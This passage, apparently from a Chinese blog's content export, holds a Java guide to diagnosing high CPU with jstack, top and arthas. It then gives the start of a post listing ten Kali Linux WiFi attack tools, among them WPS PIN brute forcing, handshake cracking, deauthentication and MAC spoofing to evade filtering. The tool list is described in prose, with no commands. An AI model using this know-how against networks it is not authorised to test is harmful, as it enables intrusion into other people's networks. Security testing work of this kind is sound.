class=\"line\">        at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)  </span><br><span class=\"line\">        at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)  </span><br><span class=\"line\">        at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)  </span><br><span class=\"line\">        - locked &lt;0x000000079570b9e0\\&gt; (a java.io.InputStreamReader)  </span><br><span class=\"line\">        at java.io.InputStreamReader.read(InputStreamReader.java:184)  </span><br><span class=\"line\">        at java.io.BufferedReader.fill(BufferedReader.java:161)  </span><br><span class=\"line\">        at java.io.BufferedReader.readLine(BufferedReader.java:324)  </span><br><span class=\"line\">        - locked &lt;0x000000079570b9e0\\&gt; (a java.io.InputStreamReader)  </span><br><span class=\"line\">        at java.io.BufferedReader.readLine(BufferedReader.java:389)  </span><br><span class=\"line\">        at com.intellij.rt.execution.application.AppMainV2$1.run(AppMainV2.java:47)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os\\_prio=31 tid=0x00007fb544026000 nid=0x4603 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Finalizer&quot; #3 daemon prio=8 os\\_prio=31 tid=0x00007fb544817000 nid=0x5103 in Object.wait() \\[0x0000700002098000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">        at java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">        - waiting on &lt;0x0000000795588ed0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  </span><br><span class=\"line\">        - locked &lt;0x0000000795588ed0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  </span><br><span class=\"line\">        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Reference Handler&quot; #2 daemon prio=10 os\\_prio=31 tid=0x00007fb54303f800 nid=0x2c03 in Object.wait() \\[0x0000700001f95000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">        at java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">        - waiting on &lt;0x0000000795586bf8\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">        at java.lang.Object.wait(Object.java:502)  </span><br><span class=\"line\">        at java.lang.ref.Reference.tryHandlePending(Reference.java:191)  </span><br><span class=\"line\">        - locked &lt;0x0000000795586bf8\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;main&quot; #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  </span><br><span class=\"line\">        at java.lang.Thread.sleep(Native Method)  </span><br><span class=\"line\">        at com.jvm.JVMtest.main(JVMtest.java:6)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Thread&quot; os\\_prio=31 tid=0x00007fb544816800 nid=0x5303 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#0 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb544009800 nid=0x2507 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#1 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb54300f800 nid=0x2403 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#2 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb543010000 nid=0x2303 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#3 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb543010800 nid=0x2a03 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Periodic Task Thread&quot; os\\_prio=31 tid=0x00007fb5430b4800 nid=0x3f03 waiting on condition   </span><br><span class=\"line\">  </span><br><span class=\"line\">JNI global references: 15  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>你会发现上面的信息其实是一段一段的，摘取其中的一段为大家说明:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;main&quot; #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  </span><br><span class=\"line\">        at java.lang.Thread.sleep(Native Method)  </span><br><span class=\"line\">        at com.jvm.JVMtest.main(JVMtest.java:6)  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>main</code>:线程名称</p>\n<p><code>#1</code>:当前线程ID，从main开始，jvm会根据线程创建的顺序为其线程编号</p>\n<p><code>prio</code>:优先级的顺序，一般默认是5</p>\n<p><code>os_prio</code>:线程对应系统的优先级</p>\n<p><code>tid</code>:java内的线程id</p>\n<p><code>nid</code>:操作系统级别的线程id，是一个十六进制</p>\n<p>关于线程的信息:</p>\n<p><code>NEW</code>:线程新建，还没开始运行</p>\n<p><code>RUNNABLE</code>:正在java虚拟机中运行的线程</p>\n<p><code>BLOCKED</code> :被阻塞，正在等待监视器锁的线程</p>\n<p><code>WAITING</code> :无限期等待另一个线程执行特定操作的线程</p>\n<p><code>TIMED_WAITING</code>:等待另一个线程执行操作达到指定等待时间的线程</p>\n<p><code>TERMINATED</code>:已经退出的线程</p>\n<p>我们这里关注的最多的就是<code>nid</code></p>\n<h3 id=\"4-2-使用jstack解决CPU占用很高的问题并定位具体行数\"><a href=\"#4-2-使用jstack解决CPU占用很高的问题并定位具体行数\" class=\"headerlink\" title=\"4.2.使用jstack解决CPU占用很高的问题并定位具体行数\"></a>4.2.使用jstack解决CPU占用很高的问题并定位具体行数</h3><p>先来看一段代码:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">package com.jvm;  </span><br><span class=\"line\">  </span><br><span class=\"line\">import java.util.concurrent.ExecutorService;  </span><br><span class=\"line\">import java.util.concurrent.Executors;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public class JVMCPU &#123;  </span><br><span class=\"line\">    private static ExecutorService service = Executors.newFixedThreadPool(5);  </span><br><span class=\"line\">    private static Object lock = new Object();  </span><br><span class=\"line\">    public static class yupengTask implements Runnable&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        @Override  </span><br><span class=\"line\">        public void run() &#123;  </span><br><span class=\"line\">            synchronized (lock)&#123;  </span><br><span class=\"line\">                long sum = 0L;  </span><br><span class=\"line\">                while(true)&#123;  </span><br><span class=\"line\">                    sum +=1;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        yupengTask yupengTask = new yupengTask();  </span><br><span class=\"line\">        service.execute(yupengTask);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将这段代码上传到linux服务器，并且使用<code>nohup java JVMCPU &amp;</code>运行</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/8.png\"><br>使用<code>top</code>命令可以看到cpu被打满了</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/9.png\"><br>知道了进程的PID，如何找到进程下是哪个线程呢?可以使用命令<code>top -Hp 26964</code>，如下所示</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/10.png\"><br>从上面的图可以看到，cpu占用最多的线程是26976这个线程id，接下来就是使用<code>jstack</code>命令来查看程序的所有堆栈信息，但是，这里需要有一个注意的点，26876这个是一个十进制</p>\n<p>的，使用jstack看到的nid是十六进制，所以我们需要转换，可以使用<code>printf &quot;%x\\n&quot;</code>这个命令</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/11.png\"><br>接下来使用<code>jstack -l 26964</code>打印堆栈信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2024\\-06\\-08 12:17:36  </span><br><span class=\"line\">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.281\\-b09 mixed mode):  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Attach Listener&quot; #10 daemon prio=9 os\\_prio=0 tid=0x00007f006c001000 nid=0xc7f waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;DestroyJavaVM&quot; #9 prio=5 os\\_prio=0 tid=0x00007f00a0009800 nid=0x6955 waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;pool-1-thread-1&quot; #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f59dfcf0\\&gt; (a java.lang.Object)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  </span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:748)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- &lt;0x00000000f59e0ed0\\&gt; (a java.util.concurrent.ThreadPoolExecutor$Worker)  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Service Thread&quot; #7 daemon prio=9 os\\_prio=0 tid=0x00007f00a00d4800 nid=0x695e runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C1 CompilerThread1&quot; #6 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b9800 nid=0x695d waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C2 CompilerThread0&quot; #5 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b6800 nid=0x695c waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b5000 nid=0x695b runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Finalizer&quot; #3 daemon prio=8 os\\_prio=0 tid=0x00007f00a0082000 nid=0x695a in Object.wait() \\[0x00007f008b6f5000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">\tat java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">\t- waiting on &lt;0x00000000f5988ee0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f5988ee0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  </span><br><span class=\"line\">\tat java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Reference Handler&quot; #2 daemon prio=10 os\\_prio=0 tid=0x00007f00a007d800 nid=0x6959 in Object.wait() \\[0x00007f008b7f6000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">\tat java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">\t- waiting on &lt;0x00000000f5986c00\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">\tat java.lang.Object.wait(Object.java:502)  </span><br><span class=\"line\">\tat java.lang.ref.Reference.tryHandlePending(Reference.java:191)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f5986c00\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">\tat java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">\t- None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Thread&quot; os\\_prio=0 tid=0x00007f00a0074000 nid=0x6958 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#0 (ParallelGC)&quot; os\\_prio=0 tid=0x00007f00a001e800 nid=0x6956 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#1 (ParallelGC)&quot; os\\_prio=0 tid=0x00007f00a0020800 nid=0x6957 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Periodic Task Thread&quot; os\\_prio=0 tid=0x00007f00a00d7800 nid=0x695f waiting on condition   </span><br><span class=\"line\">  </span><br><span class=\"line\">JNI global references: 5  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>从上面的信息中，可以看到转换的结果和nid是一致的，</p>\n<p>从下面的信息中就可以看到问题其实是出现在<code>JVMCPU.java</code>的14行左右，这里给出的是14行，但是实际情况是14行的附近</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;pool-1-thread-1&quot; #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  </span><br><span class=\"line\">\t- locked &lt;0x00000000f59dfcf0\\&gt; (a java.lang.Object)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  </span><br><span class=\"line\">\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  </span><br><span class=\"line\">\tat java.lang.Thread.run(Thread.java:748)  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结合代码来看一下就很容易问题</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/12.png\"></p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h2 id=\"5-使用arthas解决CPU占用很高的问题，定位具体代码行\"><a href=\"#5-使用arthas解决CPU占用很高的问题，定位具体代码行\" class=\"headerlink\" title=\"5.使用arthas解决CPU占用很高的问题，定位具体代码行\"></a>5.使用arthas解决CPU占用很高的问题，定位具体代码行</h2><p>使用arthas解决CPU 100%问题，在方法论上要用到两个命令，</p>\n<ul>\n<li><p>dashboard 命令查看TOP N线程，</p>\n</li>\n<li><p>thread 命令查看堆栈信息</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/13.png\"><br>先来运行<code>arthas</code></p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/14.png\"><br>输入1显示如下</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/15.png\"><br>输入<code>dashboard</code>命令可以看到是哪个线程占用cpu最高</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/16.png\"><br>接下来输入<code>thread -n 3</code>，表示最忙的前3个线程并打印信息</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/17.png\"><br>从上面的图中可以看到arthas和jstack展示的信息差不多，都定位到了<code>JVMCPU.java</code>的14行程序</p>\n<h2 id=\"6-死锁导致CPU占用很高的问题分析\"><a href=\"#6-死锁导致CPU占用很高的问题分析\" class=\"headerlink\" title=\"6.死锁导致CPU占用很高的问题分析\"></a>6.死锁导致CPU占用很高的问题分析</h2><p>先来看一段代码:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class DeadlockDemo &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    // 创建两个锁对象  </span><br><span class=\"line\">    private static final Object lock1 = new Object();  </span><br><span class=\"line\">    private static final Object lock2 = new Object();  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public static void main(String\\[\\] args) &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 线程1尝试获取lock1，然后获取lock2  </span><br><span class=\"line\">        Thread thread1 = new Thread(() -&gt; &#123;  </span><br><span class=\"line\">            synchronized (lock1) &#123;  </span><br><span class=\"line\">                System.out.println(&quot;Thread 1: Holding lock 1...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                try &#123; Thread.sleep(100); &#125;   </span><br><span class=\"line\">                catch (InterruptedException e) &#123;&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">                System.out.println(&quot;Thread 1: Waiting for lock 2...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                synchronized (lock2) &#123;  </span><br><span class=\"line\">                    System.out.println(&quot;Thread 1: Holding lock 1 &amp; 2...&quot;);  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 线程2尝试获取lock2，然后获取lock1  </span><br><span class=\"line\">        Thread thread2 = new Thread(() -&gt; &#123;  </span><br><span class=\"line\">            synchronized (lock2) &#123;  </span><br><span class=\"line\">                System.out.println(&quot;Thread 2: Holding lock 2...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                try &#123; Thread.sleep(100); &#125;   </span><br><span class=\"line\">                catch (InterruptedException e) &#123;&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">                System.out.println(&quot;Thread 2: Waiting for lock 1...&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">                synchronized (lock1) &#123;  </span><br><span class=\"line\">                    System.out.println(&quot;Thread 2: Holding lock 2 &amp; 1...&quot;);  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        thread1.start();  </span><br><span class=\"line\">        thread2.start();  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将上面的代码上传到服务器，使用<code>nohuo java DeadlockDemo &amp;</code>运行起来</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/18.png\"><br>接下来使用arthas进行分析</p>\n<blockquote>\n<p>这里选择arthas，不选择jstack是因为arthas更加的方便，它的功能也比jstack丰富</p>\n</blockquote>\n<p>输入thread就可以输出线程的统计信息，其中BLOCKED代表当前阻塞的线程数</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/19.png\"><br>接下来，输入<code>thread -b</code>就可以看到线程具体的情况，在下面的图中已经准确的说明了代码在哪一行</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/20.png\"></p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h2 id=\"7-小提示\"><a href=\"#7-小提示\" class=\"headerlink\" title=\"7.小提示\"></a>7.小提示</h2><p>工具的选择建议使用arthas，它还有很多的功能在实际中很有用</p>\n<p>大家在面试的时候如果遇到cpu被打满该如何排查这样的问题，不要上来就是使用arthas来定位问题，我们的第一反应永远都是回滚版本，</p>\n<p>因为在实际中代码的问题需要分析，不会像举例子这么简单，代码经过分析改动再上线，会浪费很多时间，而有的业务是绝对不允许这么操作的，比如电商，金融的业务，</p>\n<p>所以在回答面试官的问题时候一定要先说回滚，在说解决办法.</p>\n"},{"title":"Kali中优秀Wifi渗透工具前10","date":"2024-07-14T11:22:16.000Z","_content":"\n\n**这篇文章要讨论的是目前一个非常热门的话题：渗透无线网络以及如何防止无线网络被入侵。WiFi通常都是网络环境中的一个薄弱环节，因为WiFi信号可以在范围内的任何一个地方被任何一个人捕捉到，而且只要有正确的工具以及合适的软件（例如Kali Linux），很多无线路由器中存在的安全漏洞都是可以被攻击者轻松利用的。**\n\n接下来，我们将会给大家介绍目前最热门的十大WiFi入侵工具，这些工具可以帮助我们测试无线网络环境中存在的潜在安全问题。\n\n1.   Aircrack-ng\n----------------\n\nAircrack是目前WEP/WPA/WPA2破解领域中最热门的工具，Aircrack-ng套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。Aircrack-ng是一款多合一整合套件，该套件大致包含下列几种工具：\n\n> \\-Aircrack-ng：无线密码破解\n>\n> \\-Aireplay：生成网络数据，去客户端验证\n>\n> \\-Airodump-ng：数据包捕捉\n>\n> \\-Airbase-ng：配置伪造的接入点\n\nAircrack-ng可以在Linux、Windows和macOS上运行，并且KaliLinux默认自带了该套件。如果你准备使用这款工具，那么你还需要确保自己的无线网卡具备数据包注入功能。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/1.png)\n\n2.   Reaver\n-----------\n\n排名第二的是Reaver，Reaver也是目前流行的无线网络攻击工具，它主要针对的是WPS漏洞。Reaver会对WiFi保护设置（WPS）的注册PIN码进行暴力破解攻击，并尝试恢复出WPA/WPA2密码。由于很多路由器制造商和ISP会默认开启WPS功能，因此市面上的很多路由器都无法抵御这种攻击。\n\n在使用Reaver时，无线路由器的信号一定要足够强。平均来说，Reaver可以在4-10个小时之内破解目标路由器的密码，具体破解时长还要根据接入点类型、信号强度和PIN码本身来判断。从概率论和统计学的角度来看，你有50%的机会只需要花一半时间就能够破解出目标路由器的PIN码。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/2.png)\n\n3.   Pixiewps\n-------------\n\nPixieWPS是Kali Linux新加入的一款专门针对WPS漏洞的渗透工具。PixieWPS使用C语言开发，可以用来离线爆破WPS PIN码。它所使用的技术名叫pixie dust攻击，需要注意的是，PixieWPS需要一个修改版的Reaver或Wifite才能正常运行。由于这款工具在短时间内就变得非常受欢迎了，因此它在我们的排行榜上排到了第三名。\n\n4.   Wifite\n-----------\n\nWifite是一款能够攻击多种无线加密方式（WEP/WPA/WPA2和WPS）的自动化工具， Wifite在运行之前需要提供几个参数，而Wifite将会自动帮我们完成所有的任务。它可以捕获WPA握手包，自动化去客户端验证，进行MAC地址欺骗，以及破解WiFi密码。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/3.png)\n\n5.   Wireshark\n--------------\n\nWireshark算得上是目前最好的网络协议分析工具了，在Wireshark的帮助下，你能够深入地分析一个网络，并获取到尽可能多的信息。Wireshark能够实时捕获网络数据包、对上百种协议进行深入分析、以及浏览和过滤数据包。需要注意的是，Wireshark是一款跨平台工具。\n\nKaliLinux默认自带了Wireshark，不过Windows和macOS用户都可以使用它。如果你想使用Wireshark的某些特殊功能，那么你需要一款支持监听模式的WiFi适配器。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/4.png)\n\n6.   oclHashcat\n---------------\n\noclHashcat并不是一款专用的WiFi入侵工具，而且它也不是Kali Linux的自带工具，但它能够对捕捉到的握手包进行高速爆破攻击和字典攻击（使用GPU跑字典）。在使用了Aircrack-ng或其他工具捕捉到了握手包之后，我们就可以使用GPU和oclHashcat来破解WiFi密码了，而且GPU+oclHashcat的破解速度要比CPU+Aircrack-ng的速度快得多。\n\noclHashcat适用于Windows和Linux，并且还有专门针对AMD和Nvidia显卡的版本。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/5.png)\n\n7.   Fern Wifi Cracker\n----------------------\n\nFern Wifi Cracker是一款针对无线网络的安全审计工具和攻击工具，该工具采用Python编写，它也是这十大无线攻击工具中唯一一款具有图形用户界面的工具。Fern Wifi Cracker能够破解WEP、WPA和WPS密钥，并且还包含有能够执行MiTM（中间人攻击）攻击的组件。\n\n8.   Wash\n---------\n\n当攻击者在对WPS PIN码进行暴力破解攻击时，很多接入点会将自己锁定以保证路由器的安全性。而Wash就是一款能够确定目标接入点是否开启了WPS的工具，在使用Reaver进行了多次尝试之后，你可以用Wash来检查接入点是否锁定了WPS。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/6.png)\n\n9.   Crunch\n-----------\n\nCrunch可以用来生成自定义字典，而生成的字典可以用于字典攻击。由于字典攻击的成功率依赖于所使用字典的质量，因此我们总是不可避免地要根据自己的需要来生成字典。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/7.png)\n\n10\\.  Macchanger\n----------------\n\n实际上，Macchanger是一款能够将你设备的MAC地址改成随机值的小工具，当然了，你也可以将其修改为你想要的数据。为了避免目标设备采用了MAC地址过滤，所以对于WiFi攻击来说，MAC地址修改就显得非常重要了。\n\n![](./2024/07/14/Kali中优秀Wifi渗透工具前10/8.png)\n\n总结\n--\n\n希望本文总结出的十大热门WiFi攻击工具能够给大家提供一定的帮助，就目前的情况来看，无线网络的安全性仍然有很大的提升空间，而这种安全性的提升需要整个社区贡献自己的力量。\n","source":"_posts/Kali中优秀Wifi渗透工具前10.md","raw":"---\ntitle: Kali中优秀Wifi渗透工具前10\ndate: 2024-07-14 19:22:16\ntags: wifi密码\ncategories: 工具\n---\n\n\n**这篇文章要讨论的是目前一个非常热门的话题：渗透无线网络以及如何防止无线网络被入侵。WiFi通常都是网络环境中的一个薄弱环节，因为WiFi信号可以在范围内的任何一个地方被任何一个人捕捉到，而且只要有正确的工具以及合适的软件（例如Kali Linux），很多无线路由器中存在的安全漏洞都是可以被攻击者轻松利用的。**\n\n接下来，我们将会给大家介绍目前最热门的十大WiFi入侵工具，这些工具可以帮助我们测试无线网络环境中存在的潜在安全问题。\n\n1.   